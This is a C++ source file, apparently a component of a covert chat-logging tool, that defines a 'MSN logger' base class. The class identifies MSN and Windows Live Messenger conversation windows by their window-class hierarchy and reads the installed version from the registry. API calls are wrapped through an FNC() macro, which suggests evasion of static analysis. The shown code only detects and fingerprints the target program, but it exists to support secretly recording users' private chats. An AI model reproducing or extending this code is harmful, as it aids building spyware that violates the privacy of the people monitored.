/*
* MSN logger, base class
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <string>
#include <vector>
#include <exception>
using namespace std;

#include "QMsn.h"
#include "QAgent.h"
#include "..\common.h"
QMsn::QMsn()
{
	hwChat = hwUserList = hwLogin = hwContacts = hwHistory = NULL;
}

/**
* Torna TRUE se la finestra identificata dall'hwnd contenuto in QProperty appartiene ad MSN
*/
BOOL QMsn::Is(HWND hw)
{
	UINT i = 1;
	WCHAR wClassName[256] = {0};
	WCHAR wTitle[256] = {0};
	HWND hTmp;

	// Msn
	PWCHAR pwClass[] = {
		L"IMWindowClass",
		L"DirectUIHWND",
		0,
	};

	// Msn Live 2009
	PWCHAR pwClass2009[] = {
		L"IMWindowClass",
		L"IM Window Class",
		L"DirectUIHWND",
		0,
	};

	// Msn Live 2011
	PWCHAR pwClass2011[] = {
		L"TabbedHostWndClass",
		L"WLXDUI",
		L"CtrlNotifySink",
		L"MsgrViewHost View Host",
		0,
	};

	if(FNC(GetClassNameW)(hw, wClassName, 256) == 0)
		return FALSE;

	hTmp = hw;
	i = 1;
	if(!wcsncmp(wClassName, pwClass[0], wcslen(wClassName)))  {
		while(pwClass[i] != 0){
			hTmp = FNC(FindWindowExW)(hTmp, NULL, pwClass[i], NULL);
		
			// Non e' Msn
			if(hTmp == NULL)
				break;

			i++;
		}
		if (hTmp)
			return TRUE;
	}

	hTmp = hw;
	i = 1;
	if(!wcsncmp(wClassName, pwClass2009[0], wcslen(wClassName)))  {
		while(pwClass2009[i] != 0){
			hTmp = FNC(FindWindowExW)(hTmp, NULL, pwClass2009[i], NULL);

			// Non e' Msn Live 2009
			if(hTmp == NULL)
				break;

			i++;
		}
		if (hTmp)
			return TRUE;
	}

	hTmp = hw;
	i = 1;
	if(!wcsncmp(wClassName, pwClass2011[0], wcslen(wClassName)))  {
		while(pwClass2011[i] != 0){
			hTmp = FNC(FindWindowExW)(hTmp, NULL, pwClass2011[i], NULL);

			// Non e' Msn Live 2011
			if(hTmp == NULL)
				break;

			i++;
		}
		if (hTmp)
			return TRUE;
	}

	return FALSE;
}

UINT QMsn::Version(const HWND hw)
{
	UINT uVersion;
	BYTE bVersion;

	uVersion = VersionEx(NULL);
	bVersion = (BYTE)((uVersion & 0xff000000) >> 24);

	switch(bVersion){
		case 0x0f:
			return MSN_LIVE_2011;

		case 0x0e:
			return MSN_LIVE_2009;

		case 0x08:
			return MSN_LIVE;

		case 0x07:
			return MSN_7;

		case 0x06:
			return MSN_6;

		default:
			return UNKNOWN_VERSION;
	}

	return UNKNOWN_VERSION;
}

// MSN: HKEY_CURRENT_USER\Software\Microsoft\MSNMessenger\AppCompatCanary
// La versione di MSN e' storata in questo modo: x.x.xxxx.xxxx, a noi interessano
// solo la major e minor version che vengono messe in un UINT (bit piu' significativo
// == major), per il momento i 16 bit inferiori dell'UINT ritornato sono settati a
// 0. Quindi la versione 8.5.1306.1101 sara' identificata come: 0x08050000
UINT QMsn::VersionEx(const HWND hw)
{
	HKEY hKey;
	WCHAR wVersion[20] = {0}, wTmp[20] = {0};
	PWCHAR pwVer;
	DWORD dSize = sizeof(wVersion);
	UINT uVersion = 0, uLen, uTmp;

	if(FNC(RegOpenKeyExW)(HKEY_CURRENT_USER, L"Software\\Microsoft\\MSNMessenger", NULL, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
		return UNKNOWN_VERSION;

	if(FNC(RegQueryValueExW)(hKey, L"AppCompatCanary", NULL, NULL, (LPBYTE)&wVersion, &dSize) != ERROR_SUCCESS){
		FNC(RegCloseKey)(hKey);
		return UNKNOWN_VERSION;
	}

	FNC(RegCloseKey)(hKey);

	pwVer = wcschr(wVersion, '.');

	if(pwVer == NULL)
		return UNKNOWN_VERSION;

	uLen = pwVer - wVersion;
	memcpy(wTmp, wVersion, uLen * sizeof(WCHAR));
	uTmp = _wtoi(wTmp);
	uVersion = uTmp << 24;

	pwVer++;
	pwVer = wcschr(pwVer, '.');

	if(pwVer == NULL)
		return uVersion;

	uLen = pwVer - wVersion - uLen - 1;
	memcpy(wTmp, pwVer - uLen, uLen * sizeof(WCHAR));
	uTmp = _wtoi(wTmp);
	uVersion |= (uTmp << 16);

	return uVersion;
}

const PWCHAR QMsn::GetMessenger()
{ 
	return L"MSN"; 
}